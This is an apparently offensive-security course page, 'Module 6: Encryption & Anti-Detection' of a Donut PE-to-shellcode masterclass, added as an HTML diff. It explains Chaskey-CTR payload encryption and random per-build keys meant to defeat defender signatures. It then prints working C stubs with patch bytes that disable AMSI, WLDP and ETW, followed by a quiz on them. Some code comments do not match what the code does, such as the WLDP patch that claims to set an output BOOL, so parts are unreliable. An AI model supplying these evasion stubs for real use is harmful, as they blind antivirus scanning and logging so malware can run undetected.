@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 6: Encryption &amp; Anti-Detection - Donut Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F369;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#ec4899;--accent2:#db2777;--gradient:linear-gradient(135deg,#ec4899,#db2777)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Donut Course</h2>
+<span>PE-to-Shellcode Masterclass</span>
+</div>
+<a class="home-link" href="../Donut_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. The PE-to-Shellcode Problem</span><span class="diff d1">B</span></a>
+<a class="mod-link" href="module2.html"><span>2. PE Loader Fundamentals</span><span class="diff d1">B</span></a>
+<a class="mod-link" href="module3.html"><span>3. .NET CLR Hosting</span><span class="diff d1">B</span></a>
+<a class="mod-link" href="module4.html"><span>4. Module Architecture</span><span class="diff d2">I</span></a>
+<a class="mod-link" href="module5.html"><span>5. The Donut Loader</span><span class="diff d2">I</span></a>
+<a class="mod-link active" href="module6.html"><span>6. Encryption &amp; Anti-Detection</span><span class="diff d2">I</span></a>
+<a class="mod-link" href="module7.html"><span>7. Advanced Payload Types</span><span class="diff d3">A</span></a>
+<a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">A</span></a>
+</nav>
+
+<main>
+<span class="diff-badge medium">Difficulty: Intermediate</span>
+<h1>Module 6: Encryption &amp; Anti-Detection</h1>
+<p class="subtitle">Chaskey block cipher internals, random key generation, entropy control, and the AMSI/WLDP/ETW bypass stubs built into the Donut loader.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how Donut protects the payload using the Chaskey lightweight block cipher in CTR mode, how random keys and nonces are generated per-shellcode, how entropy levels control the randomization of strings, and exactly how the AMSI, WLDP, and ETW bypass stubs work at the machine code level.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. The Chaskey Block Cipher</h2>
+
+<p>Donut uses the <strong>Chaskey</strong> cipher, a lightweight block cipher designed by <strong>Nicky Mouha</strong> for constrained environments. It was chosen for Donut because:</p>
+
+<ul>
+<li><strong>Tiny code footprint</strong> &mdash; the entire implementation fits in ~200 bytes of PIC code</li>
+<li><strong>No lookup tables</strong> &mdash; uses only ARX (Add, Rotate, XOR) operations, avoiding data-dependent memory access patterns</li>
+<li><strong>128-bit key</strong> and <strong>128-bit block size</strong> &mdash; sufficient security for payload encryption</li>
+<li><strong>MAC capability</strong> &mdash; Chaskey doubles as a message authentication code for integrity verification</li>
+</ul>
+
+<table>
+<tr><th>Property</th><th>Chaskey</th><th>AES-128</th><th>RC4</th></tr>
+<tr><td><strong>Block size</strong></td><td>128 bits</td><td>128 bits</td><td>Stream cipher</td></tr>
+<tr><td><strong>Key size</strong></td><td>128 bits</td><td>128 bits</td><td>40-2048 bits</td></tr>
+<tr><td><strong>Operations</strong></td><td>ARX only</td><td>SubBytes, ShiftRows, etc.</td><td>PRGA</td></tr>
+<tr><td><strong>Code size (PIC)</strong></td><td>~200 bytes</td><td>~2-4 KB (with tables)</td><td>~100 bytes</td></tr>
+<tr><td><strong>MAC support</strong></td><td>Built-in</td><td>Requires HMAC wrapper</td><td>No</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>2. Chaskey Internals</h2>
+
+<p>Chaskey operates on four 32-bit words (v0, v1, v2, v3) and applies a permutation round function. Donut uses <strong>Chaskey-LTS</strong> which applies 16 rounds for its MAC:</p>
+
+<pre><span class="lang-tag">C</span>// Chaskey permutation round (from encrypt.c)
+// Four 32-bit state words, ARX operations only
+#define ROUND(v0, v1, v2, v3) \
+    v0 += v1; v1 = ROTR32(v1, 27); v1 ^= v0;                       \
+    v2 += v3; v3 = ROTR32(v3, 24); v3 ^= v2;                       \
+    v2 += v1; v0 = ROTR32(v0, 16) + v3;                             \
+    v3 = ROTR32(v3, 19); v3 ^= v0;                                  \
+    v1 = ROTR32(v1, 25); v1 ^= v2; v2 = ROTR32(v2, 16);
+
+// Full Chaskey encryption of one 128-bit block
+void chaskey_block(DWORD key[4], DWORD data[4]) {
+    DWORD v0 = data[0] ^ key[0];
+    DWORD v1 = data[1] ^ key[1];
+    DWORD v2 = data[2] ^ key[2];
+    DWORD v3 = data[3] ^ key[3];
+
+    // 16 rounds of permutation (Chaskey-LTS)
+    for (int i = 0; i &lt; 16; i++) {
+        ROUND(v0, v1, v2, v3);
+    }
+
+    data[0] = v0 ^ key[0];
+    data[1] = v1 ^ key[1];
+    data[2] = v2 ^ key[2];
+    data[3] = v3 ^ key[3];
+}</pre>
+
+<!-- ============================================================ -->
+<h2>3. CTR Mode Operation</h2>
+
+<p>Donut uses Chaskey in <strong>Counter (CTR) mode</strong>, which turns the block cipher into a stream cipher. This is essential because the payload is not block-aligned:</p>
+
+<pre><span class="lang-tag">C</span>// Chaskey-CTR encryption/decryption (same operation)
+void chaskey_encrypt(BYTE key[16], BYTE ctr[16], BYTE *data, DWORD len) {
+    DWORD blocks = (len + 15) / 16;  // Round up to full blocks
+    BYTE  keystream[16];
+
+    for (DWORD i = 0; i &lt; blocks; i++) {
+        // Encrypt the counter to produce keystream
+        memcpy(keystream, ctr, 16);
+        chaskey_block((DWORD*)key, (DWORD*)keystream);
+
+        // XOR keystream with data
+        DWORD remaining = (i == blocks - 1) ? (len % 16 ? len % 16 : 16) : 16;
+        for (DWORD j = 0; j &lt; remaining; j++) {
+            data[i * 16 + j] ^= keystream[j];
+        }
+
+        // Increment the counter
+        for (int j = 15; j &gt;= 0; j--) {
+            if (++ctr[j]) break;  // Increment with carry
+        }
+    }
+}</pre>
+
+<div class="card">
+<h4>Why CTR Mode?</h4>
+<p>CTR mode has several advantages for shellcode: (1) encryption and decryption are the same operation (XOR with keystream), reducing code size; (2) no padding is needed since any length of data can be processed; (3) it is parallelizable, though Donut&rsquo;s implementation is sequential for simplicity.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>4. Dual-Layer Encryption</h2>
+
+<p>Donut applies encryption at two levels, each with independent keys:</p>
+
+<div class="diagram">
+<h4>Encryption Layers</h4>
+<div class="flow">
+<div class="box">MODULE data<br><small>Raw payload + metadata</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">Encrypt (Key 2)<br><small>mod_key + mod_ctr</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box">INSTANCE<br><small>Contains Key 2 + hashes</small></div>
+<div class="arrow">&rarr;</div>
+<div class="box hl">Encrypt (Key 1)<br><small>inst key + inst ctr</small></div>
+</div>
+</div>
+
+<p><strong>Layer 1:</strong> The <code>DONUT_MODULE</code> is encrypted with <code>mod_key</code> / <code>mod_ctr</code>. These keys are stored inside <code>DONUT_INSTANCE</code>.</p>
+<p><strong>Layer 2:</strong> The <code>DONUT_INSTANCE</code> itself is encrypted with a separate key/counter pair. The key material for this outer layer is derived from values embedded in the loader code during generation.</p>
+
+<p>An attacker who extracts the loader code but not the instance key cannot decrypt the instance, and without the instance, cannot decrypt the module. This creates a chain of dependencies.</p>
+
+<!-- ============================================================ -->
+<h2>5. Random Key Generation</h2>
+
+<p>Every time Donut generates shellcode, all cryptographic material is freshly randomized:</p>
+
+<pre><span class="lang-tag">C</span>// During generation (donut.c), keys are randomly generated
+// Using the OS CSPRNG for each shellcode generation
+
+// Instance-level keys
+if (!CryptGenRandom(prov, CIPHER_KEY_LEN, inst-&gt;key))
+    return DONUT_ERROR_RANDOM;
+if (!CryptGenRandom(prov, CIPHER_BLK_LEN, inst-&gt;ctr))
+    return DONUT_ERROR_RANDOM;
+
+// Module-level keys (stored inside the instance)
+if (!CryptGenRandom(prov, CIPHER_KEY_LEN, inst-&gt;mod_key))
+    return DONUT_ERROR_RANDOM;
+if (!CryptGenRandom(prov, CIPHER_BLK_LEN, inst-&gt;mod_ctr))
+    return DONUT_ERROR_RANDOM;</pre>
+
+<p>This means that generating shellcode from the same payload twice produces completely different output. There is no static key or nonce that defenders can use to create a universal decryption rule.</p>
+
+<!-- ============================================================ -->
+<h2>6. Entropy Levels</h2>
+
+<p>Donut provides configurable entropy levels that control how much randomization is applied to strings in the shellcode:</p>
+
+<table>
+<tr><th>Level</th><th>Constant</th><th>Behavior</th></tr>
+<tr><td><strong>None</strong></td><td><code>DONUT_ENTROPY_NONE</code></td><td>No encryption, no random strings. Useful for debugging. Payload is plaintext.</td></tr>
+<tr><td><strong>Random Names</strong></td><td><code>DONUT_ENTROPY_RANDOM</code></td><td>Random AppDomain names, random module names, but no encryption</td></tr>
+<tr><td><strong>Full (Default)</strong></td><td><code>DONUT_ENTROPY_DEFAULT</code></td><td>Random keys, random names, full Chaskey encryption of instance and module</td></tr>
+</table>
+
+<div class="card warn">
+<h4>Entropy None = Completely Exposed</h4>
+<p>Setting entropy to <code>DONUT_ENTROPY_NONE</code> disables all encryption and randomization. The payload sits in plaintext inside the shellcode. This is only useful for development and debugging &mdash; never use it in an operational context.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. AMSI Bypass</h2>
+
+<p>The Antimalware Scan Interface (AMSI) is integrated into the .NET CLR, PowerShell, VBScript, and JScript engines. When <code>Assembly::Load</code> is called, the CLR passes the assembly bytes to <code>AmsiScanBuffer</code>. Donut patches this function before loading the payload:</p>
+
+<pre><span class="lang-tag">C</span>// bypass.c - AMSI bypass via AmsiScanBuffer patching
+// The bypass writes a stub that makes AmsiScanBuffer return AMSI_RESULT_CLEAN
+
+BOOL DisableAMSI(PDONUT_INSTANCE inst) {
+    HMODULE amsi = inst-&gt;api.LoadLibraryA("amsi.dll");
+    if (amsi == NULL) return TRUE;  // AMSI not loaded = nothing to bypass
+
+    // Find AmsiScanBuffer
+    FARPROC scan = inst-&gt;api.GetProcAddress(amsi, "AmsiScanBuffer");
+    if (scan == NULL) return FALSE;
+
+    // Make the function writable
+    DWORD old;
+    inst-&gt;api.VirtualProtect(scan, 8, PAGE_READWRITE, &amp;old);
+
+    // Overwrite the first bytes with a stub
+    // x64: returns S_OK (AMSI_RESULT_CLEAN)
+    // x86: returns E_INVALIDARG (caller skips the scan)
+    #if defined(_WIN64)
+        // xor eax, eax ; ret  (return S_OK / AMSI_RESULT_CLEAN)
+        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+    #else
+        // mov eax, 0x80070057 ; ret 0x18
+        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+    #endif
+
+    memcpy(scan, patch, sizeof(patch));
+
+    // Restore original protection
+    inst-&gt;api.VirtualProtect(scan, 8, old, &amp;old);
+    return TRUE;
+}</pre>
+
+<div class="card">
+<h4>How the AMSI Patch Works</h4>
+<p>On x64, the patch replaces the first bytes of <code>AmsiScanBuffer</code> with <code>xor eax, eax; ret</code>. This makes the function immediately return <code>S_OK</code> (HRESULT 0), which the CLR interprets as a clean scan result. On x86, it returns <code>E_INVALIDARG</code> which causes the caller to skip the scan. Either way, the assembly bytes are never actually scanned.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>8. WLDP Bypass</h2>
+
+<p>The Windows Lockdown Policy (WLDP) controls which COM objects and scripts can be instantiated. On systems with Device Guard or WDAC, WLDP can block Donut&rsquo;s script execution. The bypass patches <code>WldpQueryDynamicCodeTrust</code> and <code>WldpIsClassInApprovedList</code>:</p>
+
+<pre><span class="lang-tag">C</span>// WLDP bypass - patch WldpQueryDynamicCodeTrust
+BOOL DisableWLDP(PDONUT_INSTANCE inst) {
+    HMODULE wldp = inst-&gt;api.LoadLibraryA("wldp.dll");
+    if (wldp == NULL) return TRUE;  // WLDP not present
+
+    // Patch WldpQueryDynamicCodeTrust to return S_OK
+    FARPROC trust = inst-&gt;api.GetProcAddress(wldp, "WldpQueryDynamicCodeTrust");
+    if (trust) {
+        DWORD old;
+        inst-&gt;api.VirtualProtect(trust, 8, PAGE_READWRITE, &amp;old);
+        BYTE patch[] = { 0x31, 0xC0, 0xC3 };  // xor eax, eax; ret
+        memcpy(trust, patch, sizeof(patch));
+        inst-&gt;api.VirtualProtect(trust, 8, old, &amp;old);
+    }
+
+    // Patch WldpIsClassInApprovedList to return S_OK + TRUE
+    FARPROC approved = inst-&gt;api.GetProcAddress(wldp, "WldpIsClassInApprovedList");
+    if (approved) {
+        DWORD old;
+        inst-&gt;api.VirtualProtect(approved, 16, PAGE_READWRITE, &amp;old);
+        // Set the output BOOL to TRUE and return S_OK
+        // This allows all COM CLSIDs to be instantiated
+        BYTE patch[] = { 0x31, 0xC0, 0xC3 };
+        memcpy(approved, patch, sizeof(patch));
+        inst-&gt;api.VirtualProtect(approved, 16, old, &amp;old);
+    }
+    return TRUE;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>9. ETW Bypass</h2>
+
+<p>Event Tracing for Windows (ETW) can log .NET assembly loading events that reveal Donut payloads to defenders. Donut optionally patches <code>EtwEventWrite</code> in ntdll.dll to suppress these events:</p>
+
+<pre><span class="lang-tag">C</span>// ETW bypass - patch EtwEventWrite to return immediately
+BOOL DisableETW(PDONUT_INSTANCE inst) {
+    // ntdll.dll is always loaded
+    HMODULE ntdll = inst-&gt;api.GetModuleHandleA("ntdll.dll");
+
+    FARPROC etw = inst-&gt;api.GetProcAddress(ntdll, "EtwEventWrite");
+    if (etw == NULL) return FALSE;
+
+    DWORD old;
+    #if defined(_WIN64)
+        // x64: single RET instruction (return immediately, no events written)
+        inst-&gt;api.VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &amp;old);
+        BYTE patch[] = { 0xC3 };
+        memcpy(etw, patch, sizeof(patch));
+        inst-&gt;api.VirtualProtect(etw, 1, old, &amp;old);
+    #else
+        // x86: RET 0x14 (clean up 20 bytes of stack arguments)
+        inst-&gt;api.VirtualProtect(etw, 4, PAGE_EXECUTE_READWRITE, &amp;old);
+        BYTE patch[] = { 0xC2, 0x14, 0x00, 0x00 };
+        memcpy(etw, patch, sizeof(patch));
+        inst-&gt;api.VirtualProtect(etw, 4, old, &amp;old);
+    #endif
+    return TRUE;
+}</pre>
+
+<div class="card">
+<h4>Bypass Levels</h4>
+<p>Donut&rsquo;s <code>bypass</code> configuration in <code>DONUT_INSTANCE</code> supports three levels: <strong>DONUT_BYPASS_NONE</strong> (no bypasses, payload may be caught), <strong>DONUT_BYPASS_ABORT</strong> (attempt bypass; if it fails, abort execution), and <strong>DONUT_BYPASS_CONTINUE</strong> (attempt bypass; if it fails, continue anyway).</p>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz" id="q6">
+<h4>Knowledge Check</h4>
+
+<div class="quiz-q" data-correct="3">
+<p>1. Why was Chaskey chosen over AES for Donut&rsquo;s payload encryption?</p>
+<label data-opt="0"><input type="radio" name="q6_1">Chaskey is cryptographically stronger than AES</label>
+<label data-opt="1"><input type="radio" name="q6_1">AES is not available in C</label>
+<label data-opt="2"><input type="radio" name="q6_1">Chaskey supports larger key sizes</label>
+<label data-opt="3"><input type="radio" name="q6_1">Chaskey has a tiny code footprint (~200 bytes) with no lookup tables, ideal for PIC</label>
+<div class="explain">Chaskey uses only ARX (Add, Rotate, XOR) operations with no S-boxes or lookup tables, making it extremely compact. An AES implementation requires 2-4 KB of code and data for its substitution tables, which is significant overhead in PIC shellcode where every byte matters.</div>
+</div>
+
+<div class="quiz-q" data-correct="1">
+<p>2. What does the AMSI bypass patch do to AmsiScanBuffer on x64?</p>
+<label data-opt="0"><input type="radio" name="q6_2">Redirects it to a custom scanning function</label>
+<label data-opt="1"><input type="radio" name="q6_2">Overwrites the first bytes with <code>xor eax, eax; ret</code> to return S_OK immediately</label>
+<label data-opt="2"><input type="radio" name="q6_2">Unloads amsi.dll from the process</label>
+<label data-opt="3"><input type="radio" name="q6_2">Modifies the AMSI provider registration in the registry</label>
+<div class="explain">The patch writes <code>xor eax, eax; ret</code> (3 bytes: 0x31 0xC0 0xC3) at the start of AmsiScanBuffer. This makes the function immediately return 0 (S_OK), which the CLR interprets as a clean scan result. The assembly bytes are never actually examined by the AMSI provider.</div>
+</div>
+
+<div class="quiz-q" data-correct="2">
+<p>3. Why does Donut use two separate encryption layers with independent keys?</p>
+<label data-opt="0"><input type="radio" name="q6_3">For performance optimization</label>
+<label data-opt="1"><input type="radio" name="q6_3">Because Chaskey can only encrypt small blocks</label>
+<label data-opt="2"><input type="radio" name="q6_3">So extracting the loader code alone does not reveal the module key, creating a chain of dependencies</label>
+<label data-opt="3"><input type="radio" name="q6_3">Because the module and instance are stored in different files</label>
+<div class="explain">The dual-layer design means an attacker must first decrypt the DONUT_INSTANCE (using Key 1 derived from loader code) to obtain Key 2, which is needed to decrypt the DONUT_MODULE containing the actual payload. Neither layer alone reveals the payload.</div>
+</div>
+
+<button class="quiz-btn" onclick="gradeQuiz('q6')">Check Answers</button>
+<div class="quiz-result"></div>
+</div>
+
+<div class="nav-btns">
+<a href="module5.html">&larr; Previous: The Donut Loader</a>
+<a class="primary" href="module7.html">Next: Advanced Payload Types &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
